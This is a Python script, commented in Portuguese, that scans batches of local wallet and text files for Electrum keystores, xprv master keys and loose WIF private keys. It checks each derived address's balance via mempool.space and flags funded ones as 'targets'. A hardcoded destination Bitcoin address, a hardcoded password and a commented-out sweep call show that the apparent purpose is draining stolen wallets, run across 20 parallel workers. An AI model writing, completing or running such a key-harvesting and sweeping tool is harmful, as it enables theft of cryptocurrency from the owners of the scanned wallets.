import json
import base64
import hashlib
import re
import os
import requests
import sys
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
PASSWORD = "Benjamin2020*1981$"
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    """Verifica saldo e exibe no formato visual antigo"""
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Formatos da Electrum: Legacy, P2SH-SegWit, Native SegWit
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            
            # Se o arquivo já cita um endereço, validamos ele, senão validamos o derivado
            target = original_addr if original_addr else addr
            
            # Pequeno delay para evitar bloqueio de API (Rate Limit)
            time.sleep(0.1)
            r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10)
            
            if r.status_code == 200:
                stats = r.json().get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    print(f"   ∟ 🔑 Chave Privada (WIF) extraída com sucesso!")
                    # Aqui entra sua função de envio:
                    # execute_sweep(k.wif(), target, bal)
                    return True
    except:
        pass
    return False

def process_file(file_path):
    print(f"--------------------------------------------------")
    print(f"🔍 ANALISANDO ARQUIVO: {file_path}")
    print(f"--------------------------------------------------")
    
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Se for um JSON da Electrum
            if '"keystore"' in content or '"keypairs"' in content:
                data = json.loads(content)
                
                # Caso 1: Endereços importados (keypairs)
                if 'keypairs' in data:
                    print(f"📦 Detectado formato 'keypairs' (Chaves Importadas)")
                    for addr, priv in data['keypairs'].items():
                        # Se for WIF claro, usa direto. Se for b64, tenta decrypt.
                        if isinstance(priv, str) and priv.startswith(('L', 'K', '5')):
                            check_balance_and_broadcast(priv, addr)
                        else:
                            # Lógica de descriptografia caso a Master Key proteja o par
                            # (Opcional se as carteiras estiverem abertas)
                            pass

                # Caso 2: Carteira Determinística (xprv)
                if 'keystore' in data and 'xprv' in data['keystore']:
                    xprv = data['keystore']['xprv']
                    if xprv.startswith('xprv'):
                        print(f"📦 Detectada Master Key (xprv). Derivando endereços...")
                        master = Key(xprv)
                        # Deriva os primeiros 50 endereços (mais comum)
                        for i in range(50):
                            child = master.subkey_for_path(f"0/{i}")
                            check_balance_and_broadcast(child.wif())
            
            # TENTATIVA 3: Scanner de Texto (para chaves soltas em .txt ou .rtf)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            for w in wifs:
                check_balance_and_broadcast(w)

    except Exception as e:
        print(f"⚠️ Erro ao processar: {e}")

if __name__ == "__main__":
    # Sharding para 20 workers
    all_files = sorted([f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key', '.rtf'))])
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} INICIADO | {len(my_files)} arquivos alocados.")
    for f in my_files:
        process_file(f)
    print(f"--------------------------------------------------")
    print(f"✅ WORKER {WORKER_ID} FINALIZADO.")
